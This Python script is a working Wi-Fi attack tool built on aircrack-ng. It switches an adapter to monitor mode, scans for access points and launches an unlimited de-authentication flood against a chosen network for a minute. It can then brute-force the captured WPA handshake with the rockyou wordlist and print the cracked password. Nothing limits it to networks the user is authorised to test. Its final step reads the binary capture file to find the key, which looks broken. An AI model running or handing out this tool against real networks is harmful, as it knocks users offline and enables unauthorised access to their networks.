#!/usr/bin/env python3

import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_wireless_networks = []

def check_for_essid(essid, lst):
    if len(lst) == 0:
        return True
    for item in lst:
        if essid in item["ESSID"]:
            return False
    return True

def list_wifi_interfaces():
    """List all Wi-Fi interfaces including those in monitor mode."""
    interfaces = []
    try:
        iw_output = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        for line in iw_output.splitlines():
            if "Interface" in line:
                interface_name = line.split()[1]
                interfaces.append(interface_name)
    except Exception as e:
        print(f"Error detecting Wi-Fi interfaces: {e}")
    return interfaces

if not 'SUDO_UID' in os.environ.keys():
    print("Run this program with sudo.")
    exit()

# Backup existing CSV and CAP files
for file_name in os.listdir():
    if file_name.endswith(".csv") or file_name.endswith(".cap"):
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except FileExistsError:
            pass
        timestamp = datetime.now()
        shutil.move(file_name, f"{directory}/backup/{timestamp}-{file_name}")

# Detect all Wi-Fi interfaces
available_interfaces = list_wifi_interfaces()

if len(available_interfaces) == 0:
    print("No Wi-Fi adapters detected. Connect a Wi-Fi adapter and try again.")
    exit()

print("Available Wi-Fi interfaces:")
for index, item in enumerate(available_interfaces):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input("Select the interface for the attack: ")
    try:
        if available_interfaces[int(wifi_interface_choice)]:
            break
    except:
        print("Enter a valid number.")

hacknic = available_interfaces[int(wifi_interface_choice)]

# Switch to monitor mode if necessary
if not hacknic.endswith("mon"):
    print("Wi-Fi adapter connected! Killing conflicting processes...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    print(f"Putting {hacknic} into monitor mode...")
    subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Discover access points
discover_access_points = subprocess.Popen(
    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            if ".csv" in file_name:
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                              'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C to select a network.\n")
        print("No |\tBSSID              |\tChannel|\tESSID")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    pass

# Select a network
while True:
    choice = input("Select a network: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Try again.")

hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# Ask user for action
while True:
    attack_choice = input("Do you want to (1) De-authenticate only or (2) De-authenticate and crack the password? [1/2]: ")
    if attack_choice in ["1", "2"]:
        break
    print("Invalid choice. Enter 1 or 2.")

print(f"Starting airodump-ng on channel {hackchannel} targeting BSSID {hackbssid}.")
airodump_process = subprocess.Popen(
    ["sudo", "airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", hacknic],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)

time.sleep(5)  # Let airodump collect initial data

print("Launching de-authentication attack for 1 minute...")
deauth_process = subprocess.Popen(
    ["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic]
)

# Show a countdown timer for the de-auth attack
for remaining in range(60, 0, -1):
    print(f"De-authentication in progress... {remaining} seconds remaining", end="\r")
    time.sleep(1)

deauth_process.terminate()
deauth_process.wait()
print("\nDe-authentication attack stopped.")

airodump_process.terminate()
airodump_process.wait()

if attack_choice == "1":
    print("De-authentication attack completed. Exiting program.")
    subprocess.run(["sudo", "airmon-ng", "stop", hacknic])
    exit()

print("Proceeding to crack the Wi-Fi password...")
wordlist_path = "/usr/share/wordlists/rockyou.txt"
if not os.path.exists(wordlist_path):
    print(f"Wordlist not found at {wordlist_path}. Please ensure rockyou.txt is available.")
    exit()

cap_files = [f for f in os.listdir() if f.endswith(".cap")]
if not cap_files:
    print("No .cap file found. Ensure airodump-ng has captured data.")
    exit()

cap_file = cap_files[0]  # Select the first .cap file

aircrack_command = ["sudo", "aircrack-ng", "-w", wordlist_path, cap_file]
with subprocess.Popen(aircrack_command, stdout=subprocess.PIPE, text=True) as aircrack_proc:
    for line in aircrack_proc.stdout:
        print(line, end="")

# Extract and display password if found
with open(cap_file, "r") as cap_content:
    aircrack_result = cap_content.read()

password_match = re.search(r"KEY FOUND! \[ (.+) \]", aircrack_result)
if password_match:
    cracked_password = password_match.group(1)
    print("\033[92m" + "="*40)
    print(f"Password Cracked: {cracked_password}")
    print("="*40 + "\033[0m")
else:
    print("Password not found. Try using a different wordlist.")

# Revert to managed mode
print("Restoring Wi-Fi adapter to managed mode...")
subprocess.run(["sudo", "airmon-ng", "stop", hacknic])

# Verify the mode change
iwconfig_result = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
if hacknic.replace("mon", "") in iwconfig_result:
    print(f"{hacknic.replace('mon', '')} is now in managed mode.")
else:
    print(f"Failed to restore {hacknic} to managed mode. Please check manually.")
